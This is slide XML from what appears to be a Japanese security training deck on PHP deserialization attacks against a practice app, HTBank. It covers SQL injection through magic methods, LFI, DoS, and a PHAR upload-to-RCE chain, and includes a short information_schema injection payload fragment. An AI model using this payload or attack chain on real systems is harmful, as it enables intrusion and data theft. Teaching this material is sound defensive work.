            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="996950" y="2063750"/>
            <a:ext cx="3143732" cy="215900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SQLi経由</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="996950" y="2330450"/>
            <a:ext cx="3143732" cy="625475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1575"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>UserModel.__get($get) がカラム名をそのままSQLに結合。UserProperty.__wakeup()経由で呼び出され、プロパティ名を攻撃者が指定できる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="996950" y="3006725"/>
            <a:ext cx="3052167" cy="609600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="61321" tIns="61321" rIns="0" bIns="35921" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>new UserProperty(1,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>"group_concat(table_name)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>from information_schema...")</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4388842" y="1882775"/>
            <a:ext cx="3414216" cy="3956050"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2511"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4569817" y="2063750"/>
            <a:ext cx="3143834" cy="215900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>LFI経由</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4569817" y="2330450"/>
            <a:ext cx="3143834" cy="625475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1575"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>マジックメソッドがプロパティ値をinclude/require/file_get_contentsのパスに使用している場合、任意ファイル読み込みに発展し得る</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4569817" y="3006725"/>
            <a:ext cx="3143834" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A7179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>成立条件：パス文字列が検証なしでファイル操作関数に渡る経路の有無</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7961809" y="1882775"/>
            <a:ext cx="3414216" cy="3956050"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2511"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8142784" y="2063750"/>
            <a:ext cx="3143834" cy="215900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>DoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8142784" y="2330450"/>
            <a:ext cx="3143834" cy="425450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1575"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>再帰的・巨大なオブジェクトグラフ、無限ループを誘発するプロパティ構造でメモリ・CPUを枯渇させる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8142784" y="2806700"/>
            <a:ext cx="3143834" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A7179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>成立条件：デシリアライズ処理自体の計算量・メモリ使用量の制御有無</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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7F6F2"/>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48866"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3335"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RCE：PHARデシリアライゼーション</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1417241"/>
            <a:ext cx="5194300" cy="4421584"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2226"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009650" y="1610916"/>
            <a:ext cx="4951159" cy="215900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>unserialize() を一度も呼んでいなくても起きる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009650" y="1890316"/>
            <a:ext cx="4951159" cy="674886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1705"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHARアーカイブのmetadataはシリアライズ可能な任意のPHP変数。PHP 7系まではphar://経由のファイル操作（file_exists, file_get_contents等）だけでmetadataが自動デシリアライズされる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009650" y="2628702"/>
            <a:ext cx="4806950" cy="508000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4E8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="83001" tIns="57601" rIns="0" bIns="32201" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHP 8.0以降は既定で無効化。ただし本教材執筆時点でなおWebの55.1%がPHP7系という調査あり</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6191250" y="1414066"/>
            <a:ext cx="5187950" cy="4427934"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2295"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6381750" y="1604566"/>
            <a:ext cx="4951159" cy="212030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HTBankでの成立条件</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6487914" y="1880096"/>
            <a:ext cx="4837374" cy="705247"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" marL="147836" indent="-147836">
              <a:lnSpc>
                <a:spcPts val="1785"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="1"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>プロフィール写真アップロードで任意拡張子（jpg偽装）を受理</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="147836" indent="-147836">
              <a:lnSpc>
                <a:spcPts val="1785"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="1"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/image?_=&lt;path&gt; がfile_existsに攻撃者指定パスをそのまま渡す</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="147836" indent="-147836">
              <a:lnSpc>
                <a:spcPts val="1785"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="1"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>phar://uploads/&lt;MD5&gt;.jpg を指定 → metadataがデシリアライズ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6381750" y="2648843"/>
            <a:ext cx="4951159" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>unserialize()のgrepだけでは発見できない経路</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7F6F2"/>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48866"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3335"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>署名付きCookieとデシリアライズの関係</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
